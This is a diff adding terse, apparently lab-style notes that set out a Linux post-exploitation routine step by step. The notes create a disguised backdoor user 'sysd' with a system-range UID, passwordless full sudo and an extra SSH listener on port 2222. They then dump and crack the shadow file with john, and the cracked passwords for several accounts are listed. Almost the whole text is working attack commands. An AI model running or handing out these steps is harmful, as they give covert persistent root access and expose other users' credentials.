@@ -1,0 +1,58 @@
+1.1 - Create a secret user named sysd
+		adduser --no-create-home sysd 
+
+1.2 - Give yser 'sysd' a password
+		passwd xxx
+		
+1.3 - Give your secret user a system UID < 1000
+		root:~\ $ usermod -u 888 sysd
+
+1.4 - Give your secret user the same GID:
+		root:~\ $ groupmod -g 888 sysd
+
+1.5 - Give your secret user full sudo access without the need for a password:
+
+		usermod -aG sudo sysd
+
+sudo visudo
+		sysd ALL=(ALL) NOPASSWD:ALL
+
+
+1.6 Test that sudo access works without your password:
+		sudo apt-get update
+
+Step 2.1
+		nano /etc/ssh/sshd_config
+
+		Port 22   
+		Port 2222
+
+
+Step 3.1
+		sudo systemctl restart sshd.service
+3.2
+	exit
+	exit
+3.3
+		ssh sysd@192.168.6.105 -p 2222
+
+4.2 
+		sudo -s
+		sudo unshadow /etc/passwd /etc/shadow > pass_list
+		sudo john pass_list
+		
+		computer (stallman)
+		freedom (babbage)
+		trustno1 (mitnik)
+		dragon (lovelace)
+		lakers (turing)
+		passw0rd (sysadmin)
+		Goodluck! (student)
+		Ym12!@ (sysd)
+
+
+
+
+
+
+
